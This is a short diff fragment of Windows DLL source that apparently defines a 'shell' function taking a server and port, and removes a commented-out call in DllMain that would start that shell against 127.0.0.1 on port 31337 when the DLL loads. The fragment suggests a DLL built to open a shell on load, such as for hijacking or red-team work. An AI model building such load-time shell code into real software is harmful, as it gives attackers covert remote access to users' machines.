@@ -76,7 +76,6 @@ int shell(LPWSTR server, unsigned int port) {
     }
 }
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    //shell((LPWSTR)L"127.0.0.1", 31337);
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
